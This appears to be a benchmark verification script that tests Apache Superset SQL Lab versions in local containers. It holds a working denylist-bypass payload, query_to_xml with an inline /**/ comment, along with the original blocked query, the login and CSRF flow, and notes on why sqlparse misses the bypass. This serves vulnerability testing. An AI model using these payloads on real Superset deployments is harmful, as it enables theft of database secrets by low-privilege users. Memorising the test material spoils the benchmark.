#!/usr/bin/env bash
# =====================================================================
# PCBV2-0045 INJ-01-superset-denylist (CVE-2024-39887 -> CVE-2025-55674)
#   seed     (CVE-2024-39887): POST /api/v1/sqllab/execute/（真实 SQL Lab API，
#            low-priv 用户 analyst 登录 + CSRF）提交直接调用被禁函数的 SQL
#              SELECT query_to_xml('SELECT val FROM pcb_secret', true, false, '')
#            V0(4.0.1 无 DISALLOWED_SQL_FUNCTIONS 执行) 可达 -> flag 在 XML 响应；
#            V1(4.0.2 sqlparse denylist) HTTP 500 disallowed function -> 阻断。
#   residual (CVE-2025-55674): 函数名与参数表之间插入内联注释
#              SELECT query_to_xml/**/('SELECT val FROM pcb_secret', true, false, '')
#            sqlparse(4.0.2) 不把 NAME/**/(...) 归组为 Function token -> denylist
#            漏检；PG 把 /**/ 当空白并执行 -> V1 可达（flag 在 XML 响应）；
#            V2(5.0.0 sqlglot AST) 阻断。
#   效果通道 = SQL Lab execute API 的 JSON 响应 body（query_to_xml 结果 XML 含 flag）。
#   判定基准 = RUN_FLAG（提交值）：正常 seed 时 RUN_FLAG=平台真 flag；wrong/stale
#             检查时 RUN_FLAG=提交的 override（通道含真 flag≠override -> 10）。
#   退出码：0=效果发生(flag 出现在响应 body) 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE_FLAG="$RUN_FLAG"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 宿主端口：compose.env 中 start.sh 写入的 PORT_V*_0，再回退 compose port。
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
case "$VERSION" in
  v0) PORT="${PORT_V0_0:-}" ;;
  v1) PORT="${PORT_V1_0:-}" ;;
  v2) PORT="${PORT_V2_0:-}" ;;
  *) PORT="" ;;
esac
if [[ -z "$PORT" ]]; then
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8088}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
fi
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=43201;; v1) PORT=43202;; v2) PORT=43203;; *) PORT=43202;;
  esac
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
fi
export PCB_TARGET_PORT="${PORT:-}"
[[ -n "$PORT" ]] || { echo "ERR: cannot resolve port for $VERSION" >&2; exit 20; }

# 就绪等待：登录接口返回 200 即 app+bootstrap 完成（bootstrap.sh 先 db upgrade/
# init/bootstrap.py 再起 gunicorn；login 由真实 Flask app 提供）
"$PY" - "$PORT" <<'PYEOF'
import sys, time, urllib.request, urllib.error, json
port = sys.argv[1]
url = f"http://127.0.0.1:{port}/api/v1/security/login"
data = json.dumps({"username": "analyst", "password": "analyst-pw",
                   "provider": "db", "refresh": True}).encode()
for _ in range(180):
    try:
        req = urllib.request.Request(url, data=data,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=10) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: superset $VERSION not ready (login failed)" >&2; exit 20; }

# 执行 + 判定：与 poc/seed_exec.py 相同的认证流（login -> csrf -> execute）。
# login 失败/传输异常 -> 20；HTTP 响应（200/500 均可）但 body 无 RUN_FLAG -> 10。
"$PY" - "$PORT" "$JUDGE_FLAG" "$MODE" <<'PYEOF'
import json, os, sys, uuid
import requests

port, flag, mode = sys.argv[1], sys.argv[2], sys.argv[3]
base = f"http://127.0.0.1:{port}"
if mode == "--seed":
    sql = "SELECT query_to_xml('SELECT val FROM pcb_secret', true, false, '')"
else:
    sql = "SELECT query_to_xml/**/('SELECT val FROM pcb_secret', true, false, '')"

s = requests.Session()
try:
    r = s.post(f"{base}/api/v1/security/login",
               json={"username": "analyst", "password": "analyst-pw",
                     "provider": "db", "refresh": True}, timeout=30)
except Exception as e:
    print(f"[verify] login transport error: {e!r}", file=sys.stderr)
    sys.exit(20)
if r.status_code != 200:
    print(f"[verify] login failed HTTP {r.status_code}: {r.text[:300]}", file=sys.stderr)
    sys.exit(20)
tok = r.json().get("access_token")
h = {"Authorization": f"Bearer {tok}"}
try:
    rc = s.get(f"{base}/api/v1/security/csrf_token/", headers=h, timeout=30)
    csrf = rc.json().get("result") if rc.status_code == 200 else None
except Exception:
    csrf = None
h2 = dict(h)
if csrf:
    h2["X-CSRFToken"] = csrf
h2["Referer"] = base
payload = {"database_id": int(os.environ.get("ANALYTICS_DB_ID", "1")),
           "sql": sql, "runAsync": False, "schema": "public", "json": True,
           "client_id": uuid.uuid4().hex[:20]}
try:
    re = s.post(f"{base}/api/v1/sqllab/execute/", headers=h2, json=payload, timeout=120)
except Exception as e:
    print(f"[verify] execute transport error: {e!r}", file=sys.stderr)
    sys.exit(20)
body = re.text
print(f"[verify {mode}] {sql}")
print(f"[verify] execute HTTP {re.status_code} body_head={body[:160]!r}")
sys.exit(0 if flag in body else 10)
PYEOF
RC=$?
echo "verify[$MODE] version=$VERSION rc=$RC (judge_flag=$JUDGE_FLAG)" >&2
exit "$RC"
